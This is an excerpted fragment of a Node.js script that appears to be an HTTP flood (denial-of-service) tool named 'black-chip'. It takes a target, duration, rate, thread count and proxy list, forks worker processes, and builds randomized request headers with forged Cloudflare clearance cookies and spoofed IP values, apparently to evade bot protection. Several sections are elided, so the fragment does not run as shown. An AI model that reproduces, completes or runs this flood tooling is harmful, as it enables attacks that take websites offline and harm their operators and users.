 ...
 if (process.argv.length < 7){console.log(`node black-chip target time rate(35) thread proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  for (let i = 5; i <= process.argv[5]; i++){
    cluster.fork();
  }
...
const con = controle_header[Math.floor(Math.floor(Math.random() * controle_header.length))];
const type = [
  "text/plain",
  "text/html",
  "application/json",
...
const randomMethod = Methods[Math.floor(Math.floor(Math.random() * Methods.length))];
...
const uap = [
 ...
 const acc = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 const lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var ty = type[Math.floor(Math.floor(Math.random() * type.length))];
 var en = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var plat = platform[Math.floor(Math.floor(Math.random() * platform.length))];
...
headers["x-cache"] = "HIT";
headers["accept-encoding"] = en;
headers["cache-control"] = con;
headers["x-frame-options"] = "SAMEORIGIN";
headers["x-xss-protection"] = "1";
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["sec-ch-ua-platform"] = plat,
...
headers["sec-fetch-mode"] = lemon;
headers["sec-fetch-site"] = seks;
...
headers["set-cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["cdn-loop"] = "cloudflare";
headers["access-control-allow-origin"] = "null";
headers["Content-Encoding"] = "gzip";
headers["alt-svc"] = "h2=:443; ma=2592000; persist=1";
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
